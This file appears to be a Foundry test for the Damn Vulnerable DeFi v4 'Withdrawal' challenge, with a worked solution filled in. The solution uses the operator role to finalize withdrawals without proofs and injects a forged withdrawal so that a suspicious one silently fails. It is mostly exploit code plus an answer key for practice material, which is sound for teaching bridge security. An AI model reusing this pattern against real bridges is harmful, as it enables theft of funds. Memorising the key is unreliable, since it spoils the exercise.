// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {L1Gateway} from "../../src/withdrawal/L1Gateway.sol";
import {L1Forwarder} from "../../src/withdrawal/L1Forwarder.sol";
import {L2MessageStore} from "../../src/withdrawal/L2MessageStore.sol";
import {L2Handler} from "../../src/withdrawal/L2Handler.sol";
import {TokenBridge} from "../../src/withdrawal/TokenBridge.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract WithdrawalChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    // Mock addresses of the bridge's L2 components
    address l2MessageStore = makeAddr("l2MessageStore");
    address l2TokenBridge = makeAddr("l2TokenBridge");
    address l2Handler = makeAddr("l2Handler");

    uint256 constant START_TIMESTAMP = 1718786915;
    uint256 constant INITIAL_BRIDGE_TOKEN_AMOUNT = 1_000_000e18;
    uint256 constant WITHDRAWALS_AMOUNT = 4;
    bytes32 constant WITHDRAWALS_ROOT = 0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e;

    TokenBridge l1TokenBridge;
    DamnValuableToken token;
    L1Forwarder l1Forwarder;
    L1Gateway l1Gateway;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Start at some realistic timestamp
        vm.warp(START_TIMESTAMP);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy and setup infra for message passing
        l1Gateway = new L1Gateway();
        l1Forwarder = new L1Forwarder(l1Gateway);
        l1Forwarder.setL2Handler(address(l2Handler));

        // Deploy token bridge on L1
        l1TokenBridge = new TokenBridge(token, l1Forwarder, l2TokenBridge);

        // Set bridge's token balance, manually updating the `totalDeposits` value (at slot 0)
        token.transfer(address(l1TokenBridge), INITIAL_BRIDGE_TOKEN_AMOUNT);
        vm.store(address(l1TokenBridge), 0, bytes32(INITIAL_BRIDGE_TOKEN_AMOUNT));

        // Set withdrawals root in L1 gateway
        l1Gateway.setRoot(WITHDRAWALS_ROOT);

        // Grant player the operator role
        l1Gateway.grantRoles(player, l1Gateway.OPERATOR_ROLE());

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(l1Forwarder.owner(), deployer);
        assertEq(address(l1Forwarder.gateway()), address(l1Gateway));

        assertEq(l1Gateway.owner(), deployer);
        assertEq(l1Gateway.rolesOf(player), l1Gateway.OPERATOR_ROLE());
        assertEq(l1Gateway.DELAY(), 7 days);
        assertEq(l1Gateway.root(), WITHDRAWALS_ROOT);

        assertEq(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertEq(l1TokenBridge.totalDeposits(), INITIAL_BRIDGE_TOKEN_AMOUNT);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_withdrawal() public checkSolvedByPlayer {
        // there are no reverts if `success` is false in `L1Gateway` and `L1Forwarder`
        // so if token transfer in `TokenBridge` fails, the `finalizedWithdrawals` is still sets to true if `L1Gateway` with correct leaf
        // we are doing aditional transfer of DVT tokens to player address before malicious L2 withdrawal, so there wont be enough tokens in L1 token bridge
        // the malicious withdrawal will not go through
        // after that we transfering tokens back to the bridge and continue to final withdrawal

        //without players "operator role" this will not be possible, because of merkle proof checks

        uint256 balanceBefore = token.balanceOf(address(l1TokenBridge));

        address target = address(l1Forwarder); // target passed in L2 Handler
        uint256 numOfTx = WITHDRAWALS_AMOUNT + 1;

        address[] memory l2senders = new address[](numOfTx);
        l2senders[0] = address(uint160(uint256(0x000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6)));
        l2senders[1] = address(uint160(uint256(0x0000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e)));
        l2senders[2] = player; // my tx (DVT will be sent to player address)
        l2senders[3] = address(uint160(uint256(0x000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e0))); // malicious
        l2senders[4] = address(uint160(uint256(0x000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b)));

        uint256[] memory timestamps = new uint256[](numOfTx);
        timestamps[0] = 0x0000000000000000000000000000000000000000000000000000000066729b63;
        timestamps[1] = 0x0000000000000000000000000000000000000000000000000000000066729b95;
        timestamps[2] = 0x0000000000000000000000000000000000000000000000000000000066729b95; // my tx
        timestamps[3] = 0x0000000000000000000000000000000000000000000000000000000066729bea; // malicious
        timestamps[4] = 0x0000000000000000000000000000000000000000000000000000000066729c37;

        uint256[] memory amounts = new uint256[](numOfTx);
        amounts[0] = 0x0000000000000000000000000000000000000000000000008ac7230489e80000;
        amounts[1] = 0x0000000000000000000000000000000000000000000000008ac7230489e80000;
        amounts[2] = 0x00000000000000000000000000000000000000000000a968163f0a57b4000000; // my tx  (sends out 800_000 DVT)
        amounts[3] = 0x00000000000000000000000000000000000000000000d38be6051f27c2600000; // malicious (will not have enough DVT to transfer to)
        amounts[4] = 0x0000000000000000000000000000000000000000000000008ac7230489e80000;

        uint256[] memory nonces = new uint256[](numOfTx);
        nonces[0] = 0;
        nonces[1] = 1;
        nonces[2] = 999; // my tx  (could have random nonce)
        nonces[3] = 2; // malicious
        nonces[4] = 3;

        for (uint256 i = 0; i < numOfTx; ++i) {
            // inner message with call to L1 Token Bridge
            bytes memory message =
                abi.encodeWithSelector(l1TokenBridge.executeTokenWithdrawal.selector, l2senders[i], amounts[i]);

            // complete data for forwarder
            bytes memory data = abi.encodeWithSelector(
                l1Forwarder.forwardMessage.selector, nonces[i], l2senders[i], address(l1TokenBridge), message
            );

            // pass 7 days
            vm.warp(timestamps[i] + l1Gateway.DELAY());

            l1Gateway.finalizeWithdrawal(nonces[i], l2Handler, target, timestamps[i], data, new bytes32[](0));
            // after malicious tx, player sends DVT back to the bridge
            if (i == 3) {
                token.transfer(address(l1TokenBridge), amounts[i - 1]);
            }
        }

        uint256 balanceAfter = token.balanceOf(address(l1TokenBridge));
        console.log("Bridge DVT balance diff (before - after): ", (balanceBefore - balanceAfter) / 1e18, " DVT");
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Token bridge still holds most tokens
        assertLt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertGt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT * 99e18 / 100e18);

        // Player doesn't have tokens
        assertEq(token.balanceOf(player), 0);

        // All withdrawals in the given set (including the suspicious one) must have been marked as processed and finalized in the L1 gateway
        assertGe(l1Gateway.counter(), WITHDRAWALS_AMOUNT, "Not enough finalized withdrawals");
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"),
            "First withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"),
            "Second withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"),
            "Third withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"),
            "Fourth withdrawal not finalized"
        );
    }
}
